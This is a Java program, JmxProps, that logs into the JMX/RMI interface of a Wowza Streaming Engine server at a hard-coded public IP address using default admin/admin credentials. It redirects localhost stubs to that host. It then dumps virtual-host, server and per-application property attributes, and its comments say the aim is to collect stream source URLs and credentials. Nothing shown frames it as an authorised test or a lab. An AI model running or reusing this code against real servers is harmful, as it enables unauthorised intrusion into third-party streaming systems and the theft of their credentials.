import javax.management.*;
import javax.management.remote.*;
import javax.management.remote.rmi.*;
import javax.management.openmbean.*;
import java.rmi.*;
import java.rmi.server.*;
import java.io.*;
import java.net.*;
import java.util.*;
public class JmxProps {
  static final String REAL="160.202.130.243";
  static class RSF extends RMISocketFactory {
    public Socket createSocket(String host,int port) throws IOException {
      if (host==null||host.equals("localhost")||host.equals("127.0.0.1")||host.equals("0.0.0.0")) host=REAL;
      Socket s=new Socket(); s.setSoTimeout(20000); s.connect(new InetSocketAddress(host,port),20000); return s;
    }
    public ServerSocket createServerSocket(int port) throws IOException { return new ServerSocket(port); }
  }
  static MBeanServerConnection m;
  public static void main(String[] a) throws Exception {
    RMISocketFactory.setSocketFactory(new RSF());
    java.rmi.registry.Registry reg=java.rmi.registry.LocateRegistry.getRegistry(REAL,8085);
    RMIServer stub=(RMIServer)reg.lookup("jmxrmi");
    Map<String,Object> env=new HashMap<>(); env.put(JMXConnector.CREDENTIALS, new String[]{"admin","admin"});
    JMXConnector conn=new RMIConnector(stub,env); conn.connect(); m=conn.getMBeanServerConnection();
    // VHostItem dump
    System.out.println("=== VHostItem (_defaultVHost_) ===");
    ObjectName vh=new ObjectName("WowzaStreamingEngine:vhostItems=VHostConfigs,vhostItem=_defaultVHost_,name=VHostItem");
    try {
      MBeanInfo info=m.getMBeanInfo(vh);
      for (MBeanAttributeInfo at:info.getAttributes()){
        if(!at.isReadable()) continue;
        try { Object v=m.getAttribute(vh,at.getName()); String s=(v==null)?"null":v.toString();
          if(s.length()>1500) s=s.substring(0,1500)+"..."; System.out.println("    "+at.getName()+" = "+s);
        } catch(Exception e){ System.out.println("    "+at.getName()+" = [err:"+e.getClass().getSimpleName()+": "+e.getMessage()+"]"); }
      }
    } catch(Exception e){ System.out.println("VHostItem err: "+e); }
    // Server MBean vHostList & other attrs (retry)
    System.out.println("\n=== WowzaStreamingEngine:name=Server (all attrs) ===");
    ObjectName sv=new ObjectName("WowzaStreamingEngine:name=Server");
    try {
      MBeanInfo info=m.getMBeanInfo(sv);
      for (MBeanAttributeInfo at:info.getAttributes()){
        if(!at.isReadable()) continue;
        try { Object v=m.getAttribute(sv,at.getName()); String s=(v==null)?"null":v.toString();
          if(s.length()>1500) s=s.substring(0,1500)+"..."; System.out.println("    "+at.getName()+" = "+s);
        } catch(Exception e){ System.out.println("    "+at.getName()+" = [err:"+e.getClass().getSimpleName()+"]"); }
      }
    } catch(Exception e){ System.out.println("Server err: "+e); }
    // Dump Application-level Properties MBeans (often contain stream source creds)
    System.out.println("\n=== Application Properties (sample apps) ===");
    String[] sample={"cableoperadortelevip01","aretroplustv01","live","midiaseven"};
    for (String app: sample){
      ObjectName pn=new ObjectName("WowzaStreamingEngine:vHosts=VHosts,vHostName=_defaultVHost_,applications=Applications,applicationName="+app+",name=Properties");
      try {
        MBeanInfo info=m.getMBeanInfo(pn);
        System.out.println("-- "+app+" Properties --");
        for (MBeanAttributeInfo at:info.getAttributes()){
          if(!at.isReadable()) continue;
          try { Object v=m.getAttribute(pn,at.getName()); String s=(v==null)?"null":v.toString();
            if(s.length()>2000) s=s.substring(0,2000)+"..."; System.out.println("    "+at.getName()+" = "+s);
          } catch(Exception e){ System.out.println("    "+at.getName()+" = [err:"+e.getClass().getSimpleName()+"]"); }
        }
      } catch(Exception e){ System.out.println("-- "+app+" Properties err: "+e.getMessage()); }
    }
    // ApplicationInstance Properties (per-instance, often has source stream URL+creds)
    System.out.println("\n=== ApplicationInstance (sample) attributes ===");
    ObjectName ai=new ObjectName("WowzaStreamingEngine:vHosts=VHosts,vHostName=_defaultVHost_,applications=Applications,applicationName=live,applicationInstances=ApplicationInstances,applicationInstanceName=_definst_,name=ApplicationInstance");
    try {
      MBeanInfo info=m.getMBeanInfo(ai);
      for (MBeanAttributeInfo at:info.getAttributes()){
        if(!at.isReadable()) continue;
        try { Object v=m.getAttribute(ai,at.getName()); String s=(v==null)?"null":v.toString();
          if(s.length()>1200) s=s.substring(0,1200)+"..."; System.out.println("    "+at.getName()+" = "+s);
        } catch(Exception e){ System.out.println("    "+at.getName()+" = [err:"+e.getClass().getSimpleName()+"]"); }
      }
    } catch(Exception e){ System.out.println("AI err: "+e); }
    conn.close();
  }
}
